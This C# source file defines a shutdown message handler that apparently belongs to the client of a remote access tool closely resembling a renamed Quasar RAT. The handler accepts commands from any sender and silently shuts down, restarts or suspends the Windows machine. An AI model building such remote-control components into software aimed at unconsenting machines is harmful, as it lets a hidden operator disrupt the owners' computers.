using Q3C273.Shared.Enums;
using Q3C273.Shared.Messages;
using Q3C273.Shared.Messages.Shutdown;
using Q3C273.Shared.Networking;
using System;
using System.Diagnostics;
using System.Windows.Forms;

namespace Ton618.MessageHandlers
{
    public class ShutdownHandler : IMessageProcessor
    {
        public bool CanExecute(IMessage message) => message is DoShutdownAction;

        public bool CanExecuteFrom(ISender sender) => true;

        public void Execute(ISender sender, IMessage message)
        {
            switch (message)
            {
                case DoShutdownAction msg:
                    Execute(sender, msg);
                    break;
            }
        }

        private void Execute(ISender client, DoShutdownAction message)
        {
            try
            {
                var startInfo = new ProcessStartInfo();
                switch (message.Action)
                {
                    case ShutdownAction.Shutdown:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/s /t 0"; // shutdown
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Restart:
                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                        startInfo.UseShellExecute = true;
                        startInfo.Arguments = "/r /t 0"; // restart
                        startInfo.FileName = "shutdown";
                        Process.Start(startInfo);
                        break;
                    case ShutdownAction.Standby:
                        Application.SetSuspendState(PowerState.Suspend, true, true); // standby
                        break;
                }
            }
            catch (Exception ex)
            {
                client.Send(new SetStatus { Message = $"Action failed: {ex.Message}" });
            }
        }
    }
}
